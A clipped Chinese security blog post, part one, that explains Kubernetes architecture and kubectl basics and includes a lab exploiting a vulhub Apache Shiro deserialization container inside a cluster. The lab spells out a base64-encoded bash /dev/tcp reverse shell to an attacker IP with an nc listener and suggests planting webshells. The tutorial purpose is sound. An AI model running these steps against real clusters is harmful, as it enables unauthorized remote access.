---
title: 【微信】K8s容器编排系统安全：从架构基础到漏洞利用与横向移动（上）
source: https://mp.weixin.qq.com/s/0impnmiWyeBw7z9q4_OpzQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-19T12:47:36+08:00
trace_id: e65d161b-6e2f-4d41-9b8a-7bdce4b818d2
content_hash: c99a541ace7fe4f2d9e44d0c1a3a3dd5dd72d90c8078311d3df00a5296205c55
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 15
  succeeded: 15
  failed_urls: []
notion_page_id: 41d75244-d011-8151-9a43-d52ceeb858e4
ioc: null
---

**安全攻防屋** *2026年11月18日 11:40*

本文系统梳理 Kubernetes 容器编排安全知识：先介绍 K8s 架构与核心组件、Pod/Service/Namespace 等基础概念，再结合环境复盘配置文件泄露、API Server 未授权访问、特权 Token、kubelet 匿名访问四类常见攻击面的利用过程，最后介绍 K8s 环境下的横向上线思路。

## 一、K8s 基础

### 01 架构概述

Kubernetes 简称 K8s，是用于自动部署、扩缩和管理容器化应用程序的开源系统，起源于 Google 的集群管理工具 Borg。简单来说，K8s 用于对容器进行部署、扩展和管理，并提供容器自动重启、自动重建等能力。

Kubernetes 集群组件逻辑图：

![Kubernetes集群组件逻辑图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3fcd4bceef98f011.png)

Kubernetes集群组件逻辑图

一个节点（Node）一般就是一台物理机或虚拟机，节点里面有多个 Pod（K8s 的最小调度单元）。Pod 是一个或多个容器的组合（一般建议一个 Pod 只放一个容器）。Pod 在创建时会被分配 IP 地址，同一节点内的 Pod 之间可以通过该 IP 直接通信。

Pod 并不是一个稳定的实体：如果 Pod 在运行过程中发生故障，K8s 会自动将其销毁并创建一个新的 Pod，而新 Pod 被重新分配的 IP 可能与原来不同，所以 K8s 提供了 Service（svc）资源对象来解决这一问题。

K8s 集群属于 Master-Slave 主从架构：Master 节点负责集群管理和资源调度，运行控制平面组件；Slave 节点即工作负载节点，一般称为 Node 节点（也叫 Worker 节点），主要负责运行 Pod。一个 Pod 里可以同时运行多个容器，容器一般封装的是基于 Docker 打包的应用。Pod 英文原意为"豌豆荚"，每个容器就像是一颗豌豆，简单来说 Pod 就是一组容器。

![控制平面组件](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0d8d26eeff429d6e.png)

| 组件  | 说明  |
| --- | --- |
| API Server | 集群的唯一入口点，提供统一的 REST API，所有集群管理和控制操作都通过 API Server 进行。我们通常使用 kubectl 工具控制集群，kubectl 正是通过 API Server 来操作集群的。 |
| etcd | 控制平面的后端数据库，采用分布式键值存储架构，用于保存集群的配置和状态信息。 |
| kube-scheduler | 负责 Pod 调度，根据资源需求和其他策略将 Pod 分配到合适的节点上。它会评估每个节点的资源利用率与可用性，管理员也可以通过配置调度策略和优先级来自定义调度过程。 |
| kube-controller-manager | 内置多个控制器（节点控制器、副本控制器、服务控制器等），用于监控和维护集群状态，使应用保持在期望状态。例如 Deployment 控制器，用于管理长期运行的无状态应用。 |
| cloud-controller-manager | 与云服务商的 API 交互以管理云资源，属于可选组件，根据集群运行环境决定是否部署。 |

![工作节点组件](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d7158c572f70b068.png)

| 组件  | 说明  |
| --- | --- |
| kubelet | 运行在每个工作节点上的节点代理，负责与主节点通信，管理 Pod 的生命周期（启动、停止和监控）。 |
| kube-proxy | 节点上的网络代理和负载均衡器，负责 Service 的实现，具体包括集群内部从 Pod 到 Service 的访问，以及外部从 NodePort 到 Service 的访问。 |
| 容器运行时（Container Runtime） | 用于运行容器的软件，如 Docker、containerd 或 CRI-O，容器运行时在工作节点上启动和管理容器。 |
| Pod | 最小部署单位，包含一个或多个容器，共享网络命名空间和存储卷，工作节点上运行的容器都在 Pod 中。 |

### 02 Pod 概念

Kubernetes 有很多技术概念，同时对应很多 API 对象，其中最重要、最基础的是 Pod。Pod 资源对象是一种集合了一到多个应用容器、存储资源、专用 IP 及支撑容器运行的其他选项的逻辑组件。

Pod 的特点：

-   Kubernetes 集群中最小的部署单位；
    
-   一个 Pod 中可以拥有多个容器；
    
-   同一个 Pod 内的容器共享网络和存储；
    
-   每一个 Pod 都会有一个 Pause 容器；
    
-   Pod 的生命周期只跟 Pause 容器一致，与其他应用容器无关。
    

Pod 可以由用户直接创建，也可以由控制器对象（如 Deployment、StatefulSet、DaemonSet 等）创建，由此分为两种类型：

| 类型  | 特点  |
| --- | --- |
| 自主式 Pod | 由用户直接创建，不受任何控制器管理，可以直接使用 `kubectl apply -f <pod-spec.yaml>` 创建。这种 Pod 在节点宕机或者由于某种原因被删除后，Kubernetes 不会尝试重新创建它。 |
| 控制器管理的 Pod | 由控制器（如 Deployment、ReplicaSet、StatefulSet、DaemonSet 等）创建和管理。控制器会根据配置创建 Pod，并确保始终有指定数量的 Pod 在运行；如果 Pod 崩溃、被删除或所在节点宕机，控制器会自动创建新的 Pod 来替换它。 |

创建自主式 Pod 的方式是通过 kubectl apply -f 命令，其中 是一个包含 Pod 定义的 YAML 文件。例如，下面是一个创建自主式 Pod 的示例 YAML 文件：

```makefile
apiVersion: v1
 
# Kubernetes API 的版本，v1 是核心 API，包括 Pod、Service 等基础对象
kind: Pod
 
# 对象类型，这里是一个 Pod
metadata:
 
# 对象的元数据，包括对象的名称、标签等
  name: standalone-pod
  labels:
    app: standalone-pod
spec:
 
# 对象的规格，描述对象应该是什么样子
  containers:
 
# Pod 中的容器列表
  - name: nginx
 
# 容器名称
    image: nginx:1.14.2
 
# 容器镜像
    ports:
    - containerPort: 80
 
# 容器监听的端口
```

在这个例子中，创建了一个名为 standalone-pod 的 Pod，里面运行了一个 nginx 容器。这种 Pod 的重要特性是：如果它因为某种原因被删除（例如 Node 宕机或手动删除），Kubernetes 不会尝试重新创建它。

控制器管理的 Pod 由 Kubernetes 控制器（如 Deployment、ReplicaSet、StatefulSet 等）创建和管理，可以自动确保指定数量的 Pod 在运行；如果 Pod 崩溃、被删除或所在节点宕机，控制器会自动创建新的 Pod 来替换它。下面是一个典型的 Deployment 示例：

```makefile
apiVersion: apps/v1
 
# 使用 apps/v1，这是 Deployment 资源对应的 API 版本
kind: Deployment
 
# 创建的资源类型为 Deployment
metadata:
 
# 元数据
  name: nginx-deployment
spec:
 
# Deployment 的规格
  replicas: 3
 
# 期望运行的 Pod 副本数量
  selector:
 
# 定义 Deployment 如何找到它要管理的 Pod
    matchLabels:
      app: nginx
  template:
 
# Deployment 创建的 Pod 模板
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.14.2
        ports:
        - containerPort: 80
```

实验准备：在每个节点（主节点以及工作节点）上传并导入 shiro.tar 镜像（后续将副本分布到多个节点，因此每个节点都需要导入）。

1\. 主节点导入镜像

```css
docker load --input shiro.tar
```

![docker load 导入镜像](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d4b16212914664fd.png)

docker load 导入镜像

2\. 上传 shiro.yaml 并部署（YAML 文件只需在主节点上传执行），内容如下：

```makefile
apiVersion: apps/v1
 
# 指定 API 版本
kind: Deployment
 
# 定义资源类型为 Deployment
metadata:
 
# 元数据部分
  name: shiro-deployment
 
# Deployment 的名称
spec:
 
# 规格部分
  replicas: 1
 
# 设置副本数量为 1
  selector:
 
# 定义选择器，用于选择管理的 Pods
    matchLabels:
      app: shiro
  template:
 
# 模板部分
    metadata:
      labels:
        app: shiro
    spec:
      containers:
 
# 容器定义部分
      - name: shiro
 
# 容器名称
        image: vulhub/shiro:1.2.4
 
# 使用的镜像及版本
        imagePullPolicy: IfNotPresent
 
# 仅在本地镜像不存在时拉取，其他选项 Always、Never
        ports:
 
# 容器端口配置
        - containerPort: 8080
 
# 容器内部的端口
---
apiVersion: v1
 
# 指定 API 版本
kind: Service
 
# 定义资源类型为 Service
metadata:
  name: shiro-service
 
# Service 的名称
spec:
  type: NodePort
 
# Service 类型为 NodePort
  selector:
 
# 选择标签为 app: shiro 的 Pods
    app: shiro
  ports:
 
# 端口配置
    - port: 8080
 
# Service 公开的端口
      targetPort: 8080
 
# 容器内的端口
      nodePort: 30011
 
# 映射到物理机的端口
```

3\. 主节点上部署服务

```nginx
kubectl apply -f shiro.yaml
```

![kubectl apply 部署](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9b03edd9286dc896.png)

kubectl apply 部署

4\. 主节点上查看 Pod

```cs
kubectl get pods
```

![kubectl get pods](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5518bde5e6e90ff6.png)

kubectl get pods

5\. 访问对应的 30011 端口（NodePort），出现如下页面说明部署成功

![Shiro 登录页](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0b67cb43c3fd0362.png)

6\. 尝试利用

使用 Shiro 反序列化漏洞综合利用工具对目标进行检测，成功识别出 Shiro 框架、RememberMe 密钥，并爆破出利用链 CommonsBeanutils1、回显方式 TomcatEcho：

![Shiro 工具检测](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/477255cd814664f8.png)

Shiro 工具检测

通过命令执行功能执行【export】，输出中包含 KUBERNETES_SERVICE_HOST=10.96.0.1、KUBERNETES_SERVICE_PORT=443 等环境变量，说明当前 shell 大概率处于 K8s 集群当中：

![export 环境变量](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a7f596bd83b347cd.png)

export 环境变量

执行【hostname -I】命令，无论执行多少次，结果始终为 10.244.2.3，说明当前只有一个业务 Pod 在响应：

![hostname -I 固定 IP](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6158c566cac3f2b6.png)

hostname -I 固定 IP

7\. 主节点执行回收命令

```javascript
kubectl delete -f shiro.yaml
```

![kubectl delete 回收环境](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ae09d1edec2c8a96.png)

kubectl delete 回收环境

8\. 修改 shiro.yaml，将副本数量改为 3（replicas: 3）

```makefile
apiVersion: apps/v1
 
# 指定 API 版本
kind: Deployment
 
# 定义资源类型为 Deployment
metadata:
  name: shiro-deployment
spec:
  replicas: 3
 
# 设置副本数量为 3，确保 Pod 分布到多个节点
  selector:
    matchLabels:
      app: shiro
  template:
    metadata:
      labels:
        app: shiro
    spec:
      containers:
      - name: shiro
        image: vulhub/shiro:1.2.4
        imagePullPolicy: IfNotPresent
 
# 仅在本地镜像不存在时拉取
        ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: shiro-service
spec:
  type: NodePort
  selector:
    app: shiro
  ports:
    - port: 8080
      targetPort: 8080
      nodePort: 30011
```

9\. 主节点重新部署服务

```nginx
kubectl apply -f shiro.yaml
```

10\. 再次利用并多次执行【hostname -I】此时 IP 在 10.244.x.x 网段内变动——由于存在多个副本，Service 的访问请求存在负载均衡。若想要获取稳定的控制权限，建议多次写入木马，或直接反弹 shell：

![hostname -I 多 IP 变动](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/247f62d5d8cc5e96.png)

hostname -I 多 IP 变动

11\. 反弹 shell

在命令执行窗口输入 base64 编码后的反弹 shell 命令（解码后为 bash -i >& /dev/tcp/10.3.4.96/4444 0>&1，即反弹到攻击机 10.3.4.96 的 4444 端口），并通过管道交给 bash 执行：

![base64 反弹 shell](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8b18d8dfd60d220c.png)

base64 反弹 shell

攻击机使用 nc -lvvp 4444 监听，成功接收到 Pod 内的反弹会话：

![nc 接收会话](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5d01fb1aaf66b0eb.png)

### 03 Service 概念

尽管 Pod 对象可以拥有 IP 地址（初始化集群时指定 Pod IP 范围），但此地址无法保证在 Pod 重启或被重建后保持不变，这会给集群中 Pod 应用间依赖关系的维护带来麻烦：前端 Pod 应用（依赖方）无法基于固定地址持续跟踪后端 Pod 应用（被依赖方）。

于是 Service 资源被用于在访问方与被访问的 Pod 之间添加一个有着固定 IP 地址的中间层，客户端向此地址发起访问请求后，由相关的 Service 资源调度并代理至后端的 Pod 对象。

简单来说，Service（服务）是用于将一组 Pod 绑定在一起，并提供一个稳定访问入口（IP 和端口）的资源对象。它主要用于解决 Pod IP 动态变化的问题，使得应用可以通过固定的 Service 名称或 ClusterIP 进行访问，而不需要关心后端 Pod 的具体 IP 地址。

| 类型  | 说明  | 访问方式 |
| --- | --- | --- |
| ClusterIP（默认） | 只在集群内部访问 | 只能通过 ClusterIP 在集群内访问 |
| NodePort | 通过宿主机 IP + 端口访问 | `http://NodeIP:NodePort` |
| LoadBalancer | 依赖云服务商的负载均衡 | 分配外部负载均衡 IP |
| ExternalName | 访问外部服务 | DNS 解析到外部地址 |

### 04 Namespace 基础概念

在 Kubernetes 中，命名空间（Namespace）是一种将集群资源划分为多个虚拟集群的方式，每个虚拟集群对应一个命名空间。

Namespace 提供的隔离主要包括以下几个方面：

1.  对象隔离：每个 Namespace 中的资源对象（如 Pod、Service、ConfigMap、Secret 等）是独立的，不会与其他 Namespace 中的对象发生冲突，因此可以在不同 Namespace 中创建相同名称的资源对象；
    
2.  命名隔离：同一个 Namespace 中资源对象的名称必须唯一，但不同 Namespace 中可以使用相同的名称；
    
3.  网络隔离：不同 Namespace 中的 Pod 之间默认可以通信，若要实现网络层面的隔离与访问控制，通常需要借助 Network Policy（网络策略）进行配置；
    
4.  资源配额：可以为每个 Namespace 设置资源配额（ResourceQuota），限制其中的资源使用量，确保某个 Namespace 不会占用过多的 CPU、内存等资源；
    
5.  RBAC 隔离：可以通过 Kubernetes 的 RBAC（基于角色的访问控制）系统为不同 Namespace 中的用户、组、服务账号定义权限，实现对不同 Namespace 的访问控制；
    
6.  可视化隔离：在 Kubernetes Dashboard 中，只有具有相应权限的用户可以查看和管理特定 Namespace 中的资源。
    

### 05 K8s 常用命令

```ini
[root@k8s-master ~]
 
# kubectl get nodes          # 查看节点
[root@k8s-master ~]
 
# kubectl get namespace      # 查看命名空间（简写 kubectl get ns）
[root@k8s-master ~]
 
# kubectl get pods -n default    # 查看 default 命名空间的 Pod
[root@k8s-master ~]
 
# kubectl get pods -A        # 查看所有命名空间的 Pod
[root@k8s-master ~]
 
# kubectl get svc            # 查看 Service
[root@k8s-master ~]
 
# kubectl get svc -A         # 查看所有命名空间的 Service
[root@k8s-master ~]
 
# kubectl get pods -A -o wide    # 查看所有 Pod（含节点、IP）
[root@k8s-master ~]
 
# kubectl describe pods -n default shiro-deployment-59d9cf469f-42vl9   # 查看 Pod 详情
 
# 连接 Pod
[root@k8s-master ~]
 
# kubectl exec -it {pod名字} -- /bin/bash
[root@k8s-master ~]
 
# kubectl exec -it shiro-deployment-59d9cf469f-d5ksd -- /bin/bash
# shell 可用 -/bin/bash、-bash、-sh 等
```

```perl
# 资源查看
kubectl version
 
# 显示 kubectl 的版本信息
kubectl cluster-info
 
# 显示集群的基本信息
kubectl get nodes
 
# 显示所有的节点信息
kubectl get pods
 
# 显示所有的 pods 信息
kubectl get sa -A
 
# 查看所有 ServiceAccount 信息
kubectl get ns
 
# 查看有哪些命名空间
kubectl -s https://172.16.1.110:6443 get cs
 
# 查看各组件信息（172.16.1.110 为 master 机器）
kubectl describe pod {name}
 
# 显示指定 pod 的详细信息
kubectl logs {name}
 
# 显示指定 pod 的日志信息
 
# 资源创建与变更
kubectl create deployment {name} --image={image}
 
# 创建 pods
kubectl scale deployment {name} --replicas={num}
 
# 修改 pods 的数量
kubectl exec -it {name} -- /bin/bash
 
# 进入指定 pod 的 bash 终端
kubectl delete deployment {name}
 
# 删除 pods
kubectl edit svc {name}
 
# 编辑 svc
kubectl create -f xxx.yaml
 
# 创建资源
kubectl apply -f xxx.yaml
 
# 应用资源
kubectl apply -f
 
# 应用目录下所有 .yaml/.yml/.json 文件
kubectl create namespace test
 
# 创建 test 命名空间
 
# 资源删除
kubectl delete -f xxx.yaml
 
# 删除资源
kubectl delete -f
 
# 删除目录下定义的资源
kubectl delete pod podName
 
# 删除指定的 pod
kubectl delete pod -n test podName
 
# 删除指定命名空间的指定 pod
kubectl delete svc svcName
 
# 删除 svc
kubectl delete ns nsName
 
# 删除命名空间
kubectl delete pod podName -n nsName --grace-period=0 --force
 
# 强制删除
kubectl delete pod podName -n nsName --grace-period=1
kubectl delete pod podName -n nsName --now
 
# ClusterRoleBinding 相关
kubectl get ClusterRoleBinding -A
 
# 查看集群角色绑定
kubectl delete ClusterRoleBinding anonymous-cluster-admin
 
# 删除匿名集群管理员绑定
kubectl get pod,svc -n kubernetes-dashboard
 
# 查看 dashboard 信息
```

![kubectl get ns 查看命名空间](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a2aac855ccfd9b3b.png)

kubectl get ns 查看命名空间

图中 default 是默认命名空间（YAML 文件中没有指定命名空间时使用），kube-flannel、kube-node-lease、kube-public、kube-system 是系统自带的命名空间。
